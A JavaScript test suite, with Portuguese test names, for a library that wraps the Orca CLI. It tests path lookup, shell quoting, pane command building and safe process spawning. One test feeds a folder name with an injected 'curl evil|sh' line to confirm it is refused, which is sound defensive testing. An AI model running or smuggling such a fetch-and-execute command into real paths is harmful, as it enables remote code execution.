import assert from "node:assert/strict";
import { tmpdir } from "node:os";
import { describe, test } from "node:test";
import { CliError } from "../lib/errors.mjs";
import {
  buildPaneCommand,
  createOrcaClient,
  findExecutable,
  needsQuoting,
  quoteArg,
  quoteForCmd,
  resolveOrcaCommand,
  runProcess,
  toForwardSlashes,
} from "../lib/orca.mjs";

describe("resolveOrcaCommand", () => {
  const cases = [
    ["ORCA_CLI_COMMAND manda", { ORCA_CLI_COMMAND: "orca-wsl" }, "linux", "orca-wsl"],
    ["checkout de desenvolvimento do Orca", { ORCA_DEV_REPO_ROOT: "/x" }, "darwin", "orca-dev"],
    ["Linux fora do Orca usa orca-ide (o orca puro é o leitor de tela)", {}, "linux", "orca-ide"],
    ["Linux dentro de um terminal do Orca", { ORCA_TERMINAL_HANDLE: "term_1" }, "linux", "orca"],
    ["Linux com ORCA_WORKTREE_ID", { ORCA_WORKTREE_ID: "x::/y" }, "linux", "orca"],
    ["macOS", {}, "darwin", "orca"],
    ["Windows", {}, "win32", "orca"],
  ];
  for (const [label, env, platform, expected] of cases) {
    test(label, () => assert.equal(resolveOrcaCommand(env, platform), expected));
  }
});

describe("findExecutable", () => {
  test("Windows: respeita o PATHEXT e prefere a primeira extensão que existir", () => {
    // O sistema de arquivos do Windows ignora a caixa: orca.cmd existe para orca.CMD.
    const exists = (path) => path.toLowerCase() === "c:\\orca\\bin\\orca.cmd";
    const found = findExecutable("orca", {
      platform: "win32",
      env: { PATH: "C:\\Windows;C:\\Orca\\bin", PATHEXT: ".EXE;.CMD" },
      exists,
    });
    assert.equal(found, "C:\\Orca\\bin\\orca.CMD");
  });

  test("Windows: comando que já tem extensão não ganha outra", () => {
    const seen = [];
    findExecutable("orca.cmd", {
      platform: "win32",
      env: { PATH: "C:\\Orca" },
      exists: (path) => {
        seen.push(path);
        return false;
      },
    });
    assert.deepEqual(seen, ["C:\\Orca\\orca.cmd"]);
  });

  test("POSIX: procura o nome exato em cada diretório do PATH", () => {
    const found = findExecutable("orca", {
      platform: "darwin",
      env: { PATH: "/usr/bin:/usr/local/bin" },
      exists: (path) => path === "/usr/local/bin/orca",
    });
    assert.equal(found, "/usr/local/bin/orca");
  });

  test("devolve null quando não acha", () => {
    assert.equal(findExecutable("orca", { platform: "linux", env: { PATH: "/a:/b" }, exists: () => false }), null);
  });

  test("ignora entradas relativas do PATH (dependeriam do diretório atual, que é o repositório)", () => {
    for (const [platform, PATH, absolute] of [
      ["linux", ".:bin::/usr/bin", "/usr/bin/orca"],
      ["win32", ".;bin;C:\\Orca", "C:\\Orca\\orca.EXE"],
    ]) {
      const seen = [];
      findExecutable("orca", {
        platform,
        env: { PATH },
        exists: (path) => {
          seen.push(path);
          return false;
        },
      });
      assert.ok(seen.includes(absolute), `deveria testar ${absolute}: ${seen}`);
      assert.ok(seen.every((path) => /^([A-Za-z]:|\/)/.test(path)), `só caminhos absolutos: ${seen}`);
    }
  });

  test("comando com caminho absoluto é testado direto, sem busca no PATH (ORCA_CLI_COMMAND)", () => {
    assert.equal(
      findExecutable("C:\\Tools\\orca.exe", { platform: "win32", env: { PATH: "C:\\Outro" }, exists: (p) => p === "C:\\Tools\\orca.exe" }),
      "C:\\Tools\\orca.exe",
    );
    assert.equal(
      findExecutable("C:\\Tools\\orca", { platform: "win32", env: { PATHEXT: ".EXE" }, exists: (p) => p === "C:\\Tools\\orca.EXE" }),
      "C:\\Tools\\orca.EXE",
    );
    assert.equal(
      findExecutable("/opt/orca/bin/orca", { platform: "linux", env: {}, exists: (p) => p === "/opt/orca/bin/orca" }),
      "/opt/orca/bin/orca",
    );
  });

  test("comando com caminho relativo não é aceito", () => {
    assert.equal(findExecutable("./orca", { platform: "linux", env: { PATH: "/usr/bin" }, exists: () => true }), null);
    assert.equal(findExecutable("bin\\orca.exe", { platform: "win32", env: {}, exists: () => true }), null);
  });
});

describe("quoteArg", () => {
  test("não cita o que é seguro", () => {
    for (const platform of ["darwin", "win32"]) {
      assert.equal(quoteArg("C:/Users/x/.agents/skills/a.mjs", platform), "C:/Users/x/.agents/skills/a.mjs");
    }
    assert.equal(quoteArg("/usr/local/lib/a-b_c.mjs", "linux"), "/usr/local/lib/a-b_c.mjs");
  });

  test("POSIX: aspas simples, escapando as aspas simples do valor", () => {
    assert.equal(quoteArg("/meus projetos/a.mjs", "darwin"), "'/meus projetos/a.mjs'");
    assert.equal(quoteArg("/it's/a.mjs", "linux"), `'/it'\\''s/a.mjs'`);
    assert.equal(quoteArg("/a$b/x", "linux"), "'/a$b/x'");
  });

  test("a vírgula é citada (o PowerShell a lê como array e racharia o caminho em dois argumentos)", () => {
    assert.equal(quoteArg("/a,b/x", "linux"), "'/a,b/x'");
    assert.equal(quoteArg("C:/Doe,John/x", "win32"), '"C:/Doe,John/x"');
  });

  test("Windows: aspas duplas para espaços", () => {
    assert.equal(quoteArg("C:/Users/Maique Almeida/a.mjs", "win32"), '"C:/Users/Maique Almeida/a.mjs"');
  });

  test("Windows: recusa o que cmd.exe ou PowerShell expandiriam", () => {
    for (const value of ['C:/a "b"/x', "C:/100%/x", "C:/a b/$HOME", "C:/a b/`x", "C:/a b/x!"]) {
      assert.throws(() => quoteArg(value, "win32"), CliError, value);
    }
  });

  test("Windows: recusa aspas curvas, que o PowerShell trata como aspas duplas", () => {
    for (const value of ["C:/a b/\u201cx", "C:/a b/x\u201d", "C:/a b/\u201ex"]) {
      assert.throws(() => quoteArg(value, "win32"), CliError, value);
    }
  });

  test("recusa caractere de controle em qualquer SO (uma quebra de linha executaria o resto da linha)", () => {
    for (const platform of ["darwin", "win32"]) {
      for (const value of ["/a\nb", "/a\rb", "/a\u001b[2Kb", "/a\u0085b", "/a\u202eb"]) {
        assert.throws(() => quoteArg(value, platform), /controle/, `${platform} ${JSON.stringify(value)}`);
      }
    }
  });
});

describe("quoteForCmd", () => {
  test("deixa passar o simples e cita o resto", () => {
    assert.equal(quoteForCmd("--json"), "--json");
    assert.equal(quoteForCmd("path:C:/Users/x"), "path:C:/Users/x");
    assert.equal(quoteForCmd("Dev Confia [default]"), '"Dev Confia [default]"');
    assert.equal(quoteForCmd("node C:/a/b.mjs run-pane C:/a/c.json 0"), '"node C:/a/b.mjs run-pane C:/a/c.json 0"');
  });

  test("recusa aspas, % e quebras de linha, e a mensagem diz o critério real", () => {
    for (const value of ['a"b', "a%b", "a\nb"]) {
      assert.throws(() => quoteForCmd(value), /sem espaços, acentos ou parênteses/);
    }
  });
});

describe("needsQuoting", () => {
  test("pede aspas para espaço, acento e parêntese, não para caminho simples", () => {
    assert.equal(needsQuoting("C:\\Users\\x\\skills"), false);
    assert.equal(needsQuoting("C:\\Users\\Maique Almeida\\skills"), true);
    assert.equal(needsQuoting("C:\\Users\\João\\skills"), true);
    assert.equal(needsQuoting("C:\\Program Files (x86)\\x"), true);
  });
});

describe("buildPaneCommand", () => {
  test("POSIX: caminhos simples ficam sem aspas", () => {
    assert.equal(
      buildPaneCommand({ scriptPath: "/s/orca-layout.mjs", layoutFile: "/r/.orca/layouts/default.layout.json", index: 2, platform: "darwin" }),
      "node /s/orca-layout.mjs run-pane /r/.orca/layouts/default.layout.json 2",
    );
  });

  test("POSIX: espaços ganham aspas simples", () => {
    assert.equal(
      buildPaneCommand({ scriptPath: "/s/o.mjs", layoutFile: "/meu repo/.orca/layouts/a.layout.json", index: 0, platform: "linux" }),
      "node /s/o.mjs run-pane '/meu repo/.orca/layouts/a.layout.json' 0",
    );
  });

  test("Windows: converte \\ em / e cita com aspas duplas", () => {
    assert.equal(
      buildPaneCommand({
        scriptPath: "C:\\Users\\x\\.agents\\skills\\o.mjs",
        layoutFile: "C:\\Meu Repo\\.orca\\layouts\\a.layout.json",
        index: 1,
        platform: "win32",
      }),
      'node C:/Users/x/.agents/skills/o.mjs run-pane "C:/Meu Repo/.orca/layouts/a.layout.json" 1',
    );
  });

  test("recusa um caminho com quebra de linha (nome de pasta malicioso)", () => {
    assert.throws(
      () => buildPaneCommand({ scriptPath: "/s/o.mjs", layoutFile: "/x\ncurl evil|sh\n/.orca/layouts/a.layout.json", index: 0, platform: "linux" }),
      /controle/,
    );
  });
});

describe("toForwardSlashes", () => {
  test("troca barras invertidas", () => assert.equal(toForwardSlashes("C:\\a\\b"), "C:/a/b"));
});

describe("runProcess", () => {
  const fakeSpawn = (calls) => (...args) => {
    calls.push(args);
    return { status: 0, stdout: "{}" };
  };

  test("POSIX: spawn direto, sem shell, com o diretório de trabalho fora do repositório", () => {
    const calls = [];
    runProcess("orca", ["status", "--json"], { platform: "darwin", env: {}, exists: () => false, spawn: fakeSpawn(calls) });
    assert.equal(calls[0][0], "orca");
    assert.deepEqual(calls[0][1], ["status", "--json"]);
    assert.equal(calls[0][2].shell, undefined);
    assert.equal(calls[0][2].cwd, tmpdir());
  });

  test("Windows com .exe: spawn direto no executável resolvido (o Node cita os argumentos)", () => {
    const calls = [];
    runProcess("orca", ["terminal", "create", "--title", "Dev Confia"], {
      platform: "win32",
      env: { PATH: "C:\\Orca" },
      exists: (path) => path === "C:\\Orca\\orca.EXE",
      spawn: fakeSpawn(calls),
    });
    assert.equal(calls[0][0], "C:\\Orca\\orca.EXE");
    assert.deepEqual(calls[0][1], ["terminal", "create", "--title", "Dev Confia"]);
    assert.equal(calls[0][2].shell, undefined);
    assert.equal(calls[0][2].cwd, tmpdir());
  });

  test("Windows com .exe indicado por ORCA_CLI_COMMAND num caminho com espaço: spawn direto, sem recusar", () => {
    const calls = [];
    const exe = "C:\\Program Files\\Orca\\orca.exe";
    runProcess(exe, ["terminal", "create", "--command", 'node "C:/a b/x.mjs" run-pane "C:/r s/l.json" 0'], {
      platform: "win32",
      env: { PATH: "" },
      exists: (path) => path === exe,
      spawn: fakeSpawn(calls),
    });
    assert.equal(calls[0][0], exe);
    assert.equal(calls[0][2].shell, undefined);
  });

  test("Windows com .cmd: roda o CAMINHO ABSOLUTO (nunca o nome puro, que o cmd.exe procuraria no diretório do repo)", () => {
    const calls = [];
    runProcess("orca", ["terminal", "create", "--title", "Dev Confia", "--json"], {
      platform: "win32",
      env: { PATH: "C:\\Orca", SystemRoot: "C:\\Windows" },
      exists: (path) => path === "C:\\Orca\\orca.CMD",
      spawn: fakeSpawn(calls),
    });
    assert.equal(calls[0][0], 'C:\\Orca\\orca.CMD terminal create --title "Dev Confia" --json');
    assert.deepEqual(calls[0][1], []);
    assert.equal(calls[0][2].shell, true);
    assert.equal(calls[0][2].cwd, tmpdir());
    assert.equal(calls[0][2].env.NoDefaultCurrentDirectoryInExePath, "1");
    assert.equal(calls[0][2].env.SystemRoot, "C:\\Windows", "o resto do ambiente é preservado");
  });

  test("Windows com .cmd num caminho com espaço: o próprio caminho vai entre aspas", () => {
    const calls = [];
    runProcess("orca", ["status"], {
      platform: "win32",
      env: { PATH: "C:\\Program Files\\Orca" },
      exists: (path) => path === "C:\\Program Files\\Orca\\orca.CMD",
      spawn: fakeSpawn(calls),
    });
    assert.equal(calls[0][0], '"C:\\Program Files\\Orca\\orca.CMD" status');
  });

  test("Windows com .cmd: recusa argumento com aspas em vez de arriscar injeção", () => {
    assert.throws(
      () =>
        runProcess("orca", ["terminal", "create", "--command", 'node "C:/a b/x.mjs"'], {
          platform: "win32",
          env: { PATH: "C:\\Orca" },
          exists: (path) => path === "C:\\Orca\\orca.CMD",
          spawn: fakeSpawn([]),
        }),
      /sem espaços, acentos ou parênteses/,
    );
  });

  test("Windows sem o executável no PATH: não cai no cmd.exe com o nome puro (seria sequestrável)", () => {
    const calls = [];
    const result = runProcess("orca", ["status"], { platform: "win32", env: { PATH: "C:\\x" }, exists: () => false, spawn: fakeSpawn(calls) });
    assert.equal(calls.length, 0, "nada pode ser executado");
    assert.equal(result.error.code, "ENOENT");
  });
});

describe("createOrcaClient.call", () => {
  const clientWith = (result) => createOrcaClient({ command: "orca", platform: "linux", spawn: () => result });

  test("devolve o result e acrescenta --json", () => {
    const calls = [];
    const client = createOrcaClient({
      command: "orca",
      platform: "linux",
      spawn: (command, args) => {
        calls.push([command, args]);
        return { status: 0, stdout: JSON.stringify({ ok: true, result: { terminal: { handle: "term_1" } } }) };
      },
    });
    assert.deepEqual(client.call(["terminal", "create"]), { terminal: { handle: "term_1" } });
    assert.deepEqual(calls[0], ["orca", ["terminal", "create", "--json"]]);
  });

  test("selector_not_found vira orientação para adicionar o repositório", () => {
    const client = clientWith({
      status: 1,
      stdout: JSON.stringify({ ok: false, error: { code: "selector_not_found", data: { selector: "path:/x" } } }),
    });
    assert.throws(() => client.call(["terminal", "create"]), /path:\/x.*orca repo add/s);
  });

  test("outros erros mostram o código, e o código fica no erro para quem precisa distinguir", () => {
    const client = clientWith({ status: 1, stdout: JSON.stringify({ ok: false, error: { code: "terminal_handle_stale" } }) });
    assert.throws(
      () => client.call(["terminal", "split"]),
      (error) =>
        error instanceof CliError &&
        error.orcaCode === "terminal_handle_stale" &&
        /'orca terminal split' falhou: terminal_handle_stale$/.test(error.message),
    );
  });

  test("a message do Orca aparece quando traz mais que o código", () => {
    const client = clientWith({
      status: 1,
      stdout: JSON.stringify({
        ok: false,
        error: { code: "runtime_error", message: "Timed out waiting for terminal handle after creation" },
      }),
    });
    assert.throws(
      () => client.call(["terminal", "create"]),
      /falhou: runtime_error — Timed out waiting for terminal handle after creation/,
    );
  });

  test("resposta que não é JSON (ex.: leitor de tela) vira erro claro, sem repassar escapes", () => {
    const client = clientWith({ status: 0, stdout: "Orca screen reader starting...\n" });
    assert.throws(() => client.call(["status"]), /Resposta inesperada do Orca.*screen reader/s);
    const escaping = clientWith({ status: 0, stdout: "\u001b[2Kevil\n" });
    assert.throws(() => client.call(["status"]), CliError);
    assert.throws(() => escaping.call(["status"]), (error) => !/\u001b/.test(error.message));
  });

  test("ENOENT orienta a registrar o CLI no Orca ou definir ORCA_CLI_COMMAND", () => {
    const client = clientWith({ error: Object.assign(new Error("spawn orca ENOENT"), { code: "ENOENT" }) });
    assert.throws(() => client.call(["status"]), /Settings → General → Orca CLI.*ORCA_CLI_COMMAND/s);
  });

  test("timeout é reportado como tal", () => {
    const client = clientWith({ error: Object.assign(new Error("timed out"), { code: "ETIMEDOUT" }) });
    assert.throws(() => client.call(["status"]), /não respondeu a tempo/);
  });
});

describe("createOrcaClient.version", () => {
  test("devolve a primeira linha da saída", () => {
    const client = createOrcaClient({ command: "orca", platform: "linux", spawn: () => ({ status: 0, stdout: "1.4.218\n" }) });
    assert.equal(client.version(), "1.4.218");
  });

  test("null quando o comando falha", () => {
    const client = createOrcaClient({ command: "orca", platform: "linux", spawn: () => ({ status: 1, stdout: "" }) });
    assert.equal(client.version(), null);
  });
});
